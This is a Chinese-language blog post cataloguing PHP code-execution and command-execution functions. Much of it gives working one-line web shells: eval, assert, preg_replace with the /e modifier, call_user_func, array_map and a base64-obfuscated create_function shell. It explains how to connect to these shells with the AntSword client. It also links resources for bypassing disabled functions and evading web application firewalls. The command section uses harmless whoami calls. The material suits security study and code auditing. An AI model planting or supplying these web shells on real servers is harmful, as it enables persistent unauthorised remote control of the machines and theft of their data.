---
title: "代码执行/命令执行总结"
date: 2019-04-10T19:56:16+08:00
draft: false
tags: ['code','exec']
categories: ['代码审计']
---

php的代码执行/命令执行函数

<!--more-->

## 代码执行
---
### eval

(PHP 4, PHP 5, PHP 7)
```php
eval( string $code) : mixed
```
把字符串 `code` 作为PHP代码执行。 

```php
eval($_POST['c']);
```

直接蚁剑链接密码为c

### assert

(PHP 4, PHP 5, PHP 7)

```php
assert( mixed $assertion[, Throwable $exception]) : bool
```
如果 `assertion` 是字符串，它将会被 assert() 当做 PHP 代码来执行。

使用方法同eval

```php
assert($_POST['c']);
```

### preg_replace

```php
preg_replace ( mixed $pattern,mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] ) : mixed
```

(PHP 4, PHP 5, PHP 7)

preg_replace — 执行一个正则表达式的搜索和替换
搜索subject中匹配pattern的部分， 以replacement进行替换。

当使用被弃用的 `e` 修饰符时, 这个函数会转义一些字符(即：`'`、`"`、 `\` 和 `NULL`
然后进行后向引用替换。**在完成替换后， 引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。**

举个栗子：

```php
echo preg_replace('/chabug/e','phpinfo()','asdasdchabugasd');
```

`/e`修饰符前的正则表达式匹配后面的字符串参数，将`chabug`字符串替换为`phpinfo()`并且以`eval()`的方式执行。

一句话:

```php
echo preg_replace('/.*/e',$_POST['c'],'');
```

### call_user_func
```php
call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed
```
(PHP 4, PHP 5, PHP 7)

`call_user_func` — 把第一个参数作为回调函数调用
第一个参数 `callback` 是被调用的回调函数，其余参数是回调函数的参数。

举个例子：

```php
call_user_func('phpinfo');
```

一句话shell:

```php
call_user_func($_POST['a'], $_POST['c']);
```

![](https://y4er.com/img/uploads/20190509169644.jpg)

蚁剑链接

![](https://y4er.com/img/uploads/20190509169934.jpg)

![](https://y4er.com/img/uploads/20190509160364.jpg)

需要设置http body和编码器

### call_user_func_array

```php
call_user_func_array ( callable $callback , array $param_arr ) : mixed
```

`call_user_func_array`  调用回调函数，并把一个数组参数作为回调函数的参数

举个例子：

```php
call_user_func_array($_POST['a'], $_POST['c']);
```

![](https://y4er.com/img/uploads/20190509160497.jpg)

和上一个函数相比只是将`$c`改为数组传入，蚁剑连接方式同理。

### create_function
```php
create_function ( string $args , string $code ) : string
```
create_function函数接收两个参数`$args` 和 `$code` 然后组成新函数`function_lambda_func($args){$code;}` 并`eval(function_lambda_func($args){$code;})`

我们不需要传参数，直接把`$code`改为普通的一句话就行了。

```php
$c=create_function("", base64_decode('QGV2YWwoJF9QT1NUWyJjIl0pOw=='));$c();
```
密码c
### array_map
```php
array_map ( callable $callback , array $array1 [, array $... ] ) : array
```
返回数组，是为 `array1` 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 `array_map() `数组数量，两者必须一样。

一句话：

```php
array_map('assert',array($_POST['c']));
```

还有诸如`array_filter`、`uksort`、`uasort`、`array_walk + preg_replace`、`preg_filter`、`mb_ereg_replace`、`register_shutdown_function`、`filter_var`

更多的回调函数请移步 [创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)

## 命令执行
---
### system
```php
system ( string $command [, int &$return_var ] ) : string
```
system — 执行外部程序，并且显示输出，本函数执行 command 参数所指定的命令， 并且输出执行结果。
```php
system('whoami');
```
### passthru
```php
passthru ( string $command [, int &$return_var ] ) : void
```
passthru — 执行外部程序并且显示原始输出
```php
passthru('whoami');
```
### exec
```php
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
```
exec() 执行 command 参数所指定的命令。
```php
echo exec("whoami");
```
### pcntl_exec
```php
pcntl_exec ( string $path [, array $args [, array $envs ]] ) : void
```
pcntl_exec — 在当前进程空间执行指定程序
`$path`指定可执行二进制文件路径
```php
pcntl_exec ( "/bin/bash" , array("whoami"));
```
**该模块不能在非Unix平台（Windows）上运行。**
### shell_exec
```php
shell_exec ( string $cmd ) : string
```
通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
```php
echo shell_exec('whoami');
```
### popen
```php
popen ( string $command , string $mode ) : resource
```
打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。
```php
$handle = popen('cmd.exe /c whoami', 'r');
$read = fread($handle, 2096);
echo $read;
pclose($handle);
```
与之对应的还有`proc_open()`函数
### 反引号
在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回，使用反引号运算符的效果与函数 `shell_exec()` 相同。
```php
echo `whoami`;
```
### ob_start
```php
ob_start ([ callback $output_callback [, int $chunk_size [, bool $erase ]]] ) : bool
```
```php
$cmd = 'system';
ob_start($cmd);
echo "$_GET[a]";
ob_end_flush();
```
实际上还是通过回调system函数，绕不过disablefunc
### mail
讲不清楚，直接贴链接

[PHP mail()函数漏洞总结](https://myzxcg.github.io/20180313.html)

[PHP's mail()远程代码执行](http://drops.blbana.cc/2016/12/19/PHP-s-mail-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/)

## bypass_disablefunc

---

<https://github.com/l3m0n/Bypass_Disable_functions_Shell>

<https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>

## 参考链接

参考各位师傅的文章

[过狗一句话编写之代码执行漏洞函数代替eval](http://www.admintony.com/%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D%E7%BC%96%E5%86%99%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%87%BD%E6%95%B0%E4%BB%A3%E6%9B%BFeval.html)

[PHP代码/命令执行漏洞](https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/)

[创造tips的秘籍——PHP回调后门](https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html)